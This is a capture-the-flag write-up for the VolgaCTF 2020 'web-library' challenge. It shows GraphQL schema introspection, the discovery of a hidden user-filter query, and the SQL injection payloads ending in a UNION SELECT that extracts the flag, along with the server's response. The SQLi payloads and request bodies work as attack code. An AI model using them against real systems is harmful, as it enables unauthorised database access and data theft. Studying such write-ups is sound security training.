# web-library

## Description

Library
We have written a pretty useful library website where you can find all our books.

Check it out at library.q.2020.volgactf.ru!

## Solution

Address: http://library.q.2020.volgactf.ru:7781/

Аfter reviewing the application we found interesting entry point: http://library.q.2020.volgactf.ru:7781/api

It is a GraphQL API route. It means that we can retrive the GraphQL Schema and find other queries and mutations.

In order to retrieve GQL Schema, we made a schema introspection request.

```
POST /api HTTP/1.1
Host: library.q.2020.volgactf.ru:7781
Content-Type: application/json
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJlbWFpbCI6ImphY2tAZGFzZi5hc2RmIiwibmFtZSI6ImphY2siLCJsb2dpbiI6ImphY2siLCJpYXQiOjE1ODU2NTcxMjAsImV4cCI6MTU4NTY2MDcyMH0.Q7faIItPOWDHjzjHG1WSuO-yjh_16qZf0k83wb5bVz8
Content-Length: 1674

{"query":"query IntrospectionQuery {\n    __schema {\n      queryType { name }\n      mutationType { name }\n      subscriptionType { name }\n      types {\n        ...FullType\n      }\n      directives {\n        name\n        description\n        locations\n        args {\n          ...InputValue\n        }\n        }\n    }\n  }\n\n  fragment FullType on __Type {\n    kind\n    name\n    description\n    fields(includeDeprecated: true) {\n      name\n      description\n      args {\n        ...InputValue\n      }\n      type {\n        ...TypeRef\n      }\n      isDeprecated\n      deprecationReason\n    }\n    inputFields {\n      ...InputValue\n    }\n    interfaces {\n      ...TypeRef\n    }\n    enumValues(includeDeprecated: true) {\n      name\n      description\n      isDeprecated\n      deprecationReason\n    }\n    possibleTypes {\n      ...TypeRef\n    }\n  }\n\n  fragment InputValue on __InputValue {\n    name\n    description\n    type { ...TypeRef }\n    defaultValue\n  }\n\n  fragment TypeRef on __Type {\n    kind\n    name\n    ofType {\n      kind\n      name\n      ofType {\n        kind\n        name\n        ofType {\n          kind\n          name\n          ofType {\n            kind\n            name\n            ofType {\n              kind\n              name\n              ofType {\n                kind\n                name\n                ofType {\n                  kind\n                  name\n                }\n              }\n            }\n          }\n        }\n      }\n    }\n  }","variables":{"filter":{"name":""}},"operationName":"IntrospectionQuery"}
```

And save the result in the schema.json file.

In order to create GQL Schema from JSON we use graphql-introspection-json-to-sdl tool:
```
graphql-introspection-json-to-sdl schema.json > schema.graphql
```

After it, we can retrive all Queries, Mutations and Subscriptions from GQL Schema with the `gqlg` tool.

```
gqlg --schemaFilePath ./schema.graphql --destDirPath ./gqlg --depthLimit 4
```

In the `gqlg` folder we see the query which we have not seen before. It is `testGetUsersByFilter`.

Try to execute it:

```
query testGetUsersByFilter($filter: UserFilter){
    testGetUsersByFilter(filter: $filter){
        login
        name
        email
    }
}
```

And we understand that we can retrieve all users with this query. But flag storing in other places.

After I saw database error in response when I try to find SQLi I understand the query logic and create valid SQLi example:
```
{"query":"query testGetUsersByFilter($filter: UserFilter){\n    testGetUsersByFilter(filter: $filter){\n        login\n        name\n        email\n    }\n}","variables":{"filter":{"login":"\\","name":" or 1=1 -- -"}},"operationName":"testGetUsersByFilter"}
```

Look at the `variables`: `"variables":{"filter":{"login":"\\","name":" or 1=1 -- -"}}`.

So the exists SQL query may looks like: 
```
SELECT * FROM Users Where login LIKE '...' OR name LIKE '...' .... 
```

So we escaped the second single quote and exit from the SQL string.

Like shown below:
```
SELECT * FROM Users Where login LIKE '...\' OR name LIKE ' or 1=1 -- - ' .... 
```

It means that the first string will be `...\' OR name LIKE ` and after it will stay our value from the `name` parameter.

Now we can make UNION-based SQLi and retrieve the flag. (Count columns of left side of the query with `ORDER BY` or `UNION SELECT null,...` )

Flag stored in the `flag` table and `flag` column that we could understand from INFORMATION_SCHEMA.

The result query:
```
{
  "operationName": "testGetUsersByFilter",
  "query": "query testGetUsersByFilter($filter: UserFilter){\n    testGetUsersByFilter(filter: $filter){\n        login\n        name\n        email\n    }\n}",
  "variables": {
    "filter": {
      "login": "\\",
      "name": " UNION SELECT null, null, null, null, (SELECT flag FROM flag LIMIT 1), null -- -"
    }
  }
}
```

Answer:
```
{
  "data": {
    "testGetUsersByFilter": [
      {
        "email": "ab ",
        "login": "' or name=",
        "name": "ab"
      },
      {
        "email": null,
        "login": null,
        "name": "VolgaCTF{EassY_GgraPhQl_T@@Sk_ek3k12kckgkdak}"
      }
    ]
  }
}
```
